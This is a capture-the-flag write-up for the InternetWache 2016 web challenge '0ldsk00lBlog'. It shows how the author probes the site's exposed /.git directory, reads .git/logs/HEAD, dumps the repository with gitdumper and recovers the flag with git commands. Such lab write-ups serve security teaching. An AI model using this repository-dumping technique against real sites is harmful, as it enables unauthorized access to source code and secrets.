#0ldsk00lBlog
###(web80, solved by 264)


>Description: I stumbled across this kinda oldskool blog. I bet it is unhackable, I mean, there's only static HTML.

>Service: https://0ldsk00lblog.ctf.internetwache.org/

First things first, go to the service and then browse the page and source code:

<html>
<head>
	<title>0ldsk00l</title>
</head>
<body>

	<h1>Welcome to my 0ldsk00l blog.</h1>
	<p>
		Now this is some oldskool classic shit. Writing your blog manually without all this crappy bling-bling CSS / JS stuff.
	</p>

	<h2>2016</h2>
	<p>
		It's 2016 now and I need to somehow keep track of my changes to this document as it grows and grows. All people are talking about a tool called 'Git'. I think I might give this a try.
	</p>

	<h2>1990-2015</h2>
	<p>
		Hmm, looks like totally forgot about this page. I should start blogging more often.
	</p>

	<h2>1990</h2>
	<p>
		I proudly present to you the very first browser for the World Wide Web. Feel free to use it to view my awesome blog.
	</p>

	<h2>1989</h2>
	<p>
		So, yeah, I decided to invent the World Wide Web and now I'm sitting here and writing this.
	</p>
</body>
</html>

Looking at the second paragraph:
`All people are talking about a tool called 'Git'. I think I might give this a try.`

the first thing I wanted to do was check if the website contained a git repo.
`https://0ldsk00lblog.ctf.internetwache.org/.git`

## Forbidden
### You don't have permission to access /.git/ on this server.

This is promising as it verifies that Git is there. The next obvious thing to do is to check and see if we can directly access some git files. The files I tried first are the log files:

`https://0ldsk00lblog.ctf.internetwache.org/.git/logs/HEAD`

Log Results:

```
0000000000000000000000000000000000000000 14d58c53d0e70c92a3a0a5d22c6a1c06c4a2d296 Sebastian Gehaxelt <github@gehaxelt.in> 1453427711 +0100  commit (initial): Initial commit
14d58c53d0e70c92a3a0a5d22c6a1c06c4a2d296 dba52097aba3af2b30ccbc589912ae67dcf5d77b Sebastian Gehaxelt <github@gehaxelt.in> 1453427733 +0100  commit: Added next post
dba52097aba3af2b30ccbc589912ae67dcf5d77b 26858023dc18a164af9b9f847cbfb23919489ab2 Sebastian Gehaxelt <github@gehaxelt.in> 1453427864 +0100  commit: Added another post
26858023dc18a164af9b9f847cbfb23919489ab2 8c46583a968da7955c13559693b3b8c5e5d5f510 Sebastian Gehaxelt <github@gehaxelt.in> 1453427881 +0100  commit: My recent blogpost
```

Next, I used a tool called `gitdumper` from `GitTools`

`https://github.com/internetwache/GitTools`

Description: `A repository with 3 tools for pwn'ing websites with .git repositories available`

`./gitdumper.sh https://0ldsk00lblog.ctf.internetwache.org/.git /tmp/git-dump`

Running `git-status` inside the cloned git project shows the output of a single file: `index.html`

Next up, I ran `git checkout .` providing me with the `index.html` file.

Finally, I ran `git show` and was able to see the diff and pick up the flag: `IW{G1T_1S_4W3SOME}`

![Flag](https://raw.githubusercontent.com/Ninjex/Wargame-Writeups/master/CaptureTheFlag/2016/InternetWache-CTF/web80/web80.png "Flag")
